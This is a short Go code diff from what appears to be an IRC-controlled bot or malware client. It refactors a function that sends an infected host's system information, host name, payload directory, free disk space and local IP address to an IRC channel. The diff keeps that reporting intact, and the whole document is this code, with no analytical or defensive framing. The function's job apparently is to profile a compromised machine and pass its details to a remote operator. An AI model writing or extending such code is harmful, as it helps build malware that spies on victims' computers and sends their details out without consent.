@@ -39,9 +39,9 @@ func ReportInf(reportIRC net.Conn, set_chan string) {
 	sFds := fmt.Sprint(FreeDiskSpace(*hw))
 	sGlp := fmt.Sprint(GetLocalIP())
 
-	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :System Info: "+SYSinfo())
-	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Host Name: "+hName)
-	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Payload DIR: "+pDir)
-	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Free Disk Space (GB): "+sFds)
-	IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Local IP: "+sGlp)
+	IRC_Report(reportIRC, set_chan, "System Info: "+SYSinfo())
+	IRC_Report(reportIRC, set_chan, "Host Name: "+hName)
+	IRC_Report(reportIRC, set_chan, "Payload DIR: "+pDir)
+	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+sFds)
+	IRC_Report(reportIRC, set_chan, "Local IP: "+sGlp)
 }
